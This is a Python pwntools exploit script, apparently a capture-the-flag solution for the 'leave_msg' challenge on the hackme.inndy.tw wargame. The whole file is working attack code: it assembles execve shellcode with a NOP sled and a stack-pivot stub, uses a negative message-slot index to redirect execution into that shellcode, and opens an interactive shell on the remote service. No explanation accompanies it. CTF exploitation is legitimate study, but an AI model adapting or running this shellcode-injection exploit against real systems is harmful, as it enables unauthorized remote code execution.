#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x80486f1'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)


elf = ELF('/home/h11p/hackme/leave_msg')


#io = process('/home/h11p/hackme/leave_msg')

io = remote('hackme.inndy.tw', 7715)



payload1 =asm("add esp,0x40")+asm("jmp esp")+"\x00"+"\x90"*20+asm(shellcraft.sh())
payload2 = "\x20"*6+"-16"
#debug()

io.recvuntil("I'm busy. Please leave your message:\n")
io.sendline(payload1)
io.recvuntil("Which message slot?\n")
io.send(payload2)
#io.recvuntil("Goodbye\n")
io.interactive()
io.close()

